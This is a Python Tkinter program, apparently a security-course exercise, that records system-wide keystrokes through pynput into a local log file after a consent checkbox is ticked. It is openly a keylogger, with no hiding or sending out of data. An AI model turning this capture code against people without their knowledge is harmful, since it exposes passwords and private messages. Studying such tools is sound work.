import datetime
import os
import threading
import tkinter as tk
from tkinter import messagebox, ttk
from pynput import keyboard

LOG_FILE = "keylog.txt"


class KeyloggerGUI:

    def __init__(self, root):
        self.root = root
        self.root.title("PRODIGY_CS_04 - Educational Keylogger")
        self.root.geometry("520x480")
        self.root.resizable(False, False)

        self.is_logging = False
        self.listener = None
        self.log_file = LOG_FILE

        self._build_ui()

    def _build_ui(self):
        # Header Title
        title_label = tk.Label(
            self.root,
            text="Keylogger Demo & Analyzer",
            font=("Arial", 16, "bold"),
        )
        title_label.pack(pady=10)

        # Ethical Notice & Consent Box
        disclaimer_frame = tk.LabelFrame(
            self.root,
            text="Ethical Disclaimer & User Consent",
            font=("Arial", 9, "bold"),
            fg="red",
        )
        disclaimer_frame.pack(padx=20, fill=tk.X)

        disclaimer_text = (
            "NOTICE: Keyloggers monitor and record keystrokes. This program is created "
            "strictly for educational purposes, security analysis, and authorised testing. "
            "Check the box below to give authorization for local monitoring."
        )
        tk.Label(
            disclaimer_frame,
            text=disclaimer_text,
            wraplength=460,
            justify=tk.LEFT,
            font=("Arial", 8),
        ).pack(padx=10, pady=5)

        self.var_consent = tk.BooleanVar(value=False)
        self.chk_consent = tk.Checkbutton(
            disclaimer_frame,
            text="I authorize this software to record my local keystrokes for testing.",
            variable=self.var_consent,
            command=self._toggle_start_btn,
        )
        self.chk_consent.pack(anchor=tk.W, padx=10, pady=5)

        # Control Buttons
        btn_frame = tk.Frame(self.root)
        btn_frame.pack(pady=15)

        self.btn_start = tk.Button(
            btn_frame,
            text="Start Logging",
            command=self.start_logging,
            bg="#4CAF50",
            fg="white",
            font=("Arial", 10, "bold"),
            width=15,
            state=tk.DISABLED,
        )
        self.btn_start.pack(side=tk.LEFT, padx=10)

        self.btn_stop = tk.Button(
            btn_frame,
            text="Stop Logging",
            command=self.stop_logging,
            bg="#f44336",
            fg="white",
            font=("Arial", 10, "bold"),
            width=15,
            state=tk.DISABLED,
        )
        self.btn_stop.pack(side=tk.LEFT, padx=10)

        # Status Display
        self.lbl_status = tk.Label(
            self.root,
            text="Status: Stopped",
            font=("Arial", 11, "bold"),
            fg="gray",
        )
        self.lbl_status.pack(pady=5)

        # Live Log Viewer / Output Field
        output_frame = tk.LabelFrame(
            self.root,
            text=f"Logged Keystrokes File ({LOG_FILE})",
            font=("Arial", 9, "bold"),
        )
        output_frame.pack(padx=20, pady=5, fill=tk.BOTH, expand=True)

        self.txt_output = tk.Text(
            output_frame, height=8, width=58, font=("Consolas", 9), state=tk.DISABLED
        )
        self.txt_output.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)

    def _toggle_start_btn(self):
        if self.var_consent.get() and not self.is_logging:
            self.btn_start.config(state=tk.NORMAL)
        else:
            self.btn_start.config(state=tk.DISABLED)

    def _write_log(self, text):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(text)

        # Update GUI viewer safely
        self.txt_output.config(state=tk.NORMAL)
        self.txt_output.insert(tk.END, text)
        self.txt_output.see(tk.END)
        self.txt_output.config(state=tk.DISABLED)

    def _on_press(self, key):
        if not self.is_logging:
            return False

        try:
            # Handle regular character keys
            char = key.char
            if char is not None:
                self._write_log(char)
        except AttributeError:
            # Handle special function keys
            if key == keyboard.Key.space:
                self._write_log(" ")
            elif key == keyboard.Key.enter:
                self._write_log("\n[ENTER]\n")
            elif key == keyboard.Key.backspace:
                self._write_log(" [BACKSPACE] ")
            elif key == keyboard.Key.tab:
                self._write_log("\t")
            else:
                clean_key = str(key).replace("Key.", "").upper()
                self._write_log(f" [{clean_key}] ")

    def start_logging(self):
        if not self.var_consent.get():
            messagebox.showwarning("Consent Required", "Please check the authorization box first.")
            return

        self.is_logging = True
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.chk_consent.config(state=tk.DISABLED)

        self.lbl_status.config(text="Status: Logging Active...", fg="green")

        # Write timestamp session header
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._write_log(f"\n--- Logging Session Started: {timestamp} ---\n")

        # Start background keyboard listener thread
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop_logging(self):
        self.is_logging = False
        if self.listener:
            self.listener.stop()

        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.chk_consent.config(state=tk.NORMAL)

        self.lbl_status.config(text="Status: Stopped", fg="red")

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._write_log(f"\n--- Logging Session Stopped: {timestamp} ---\n")


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()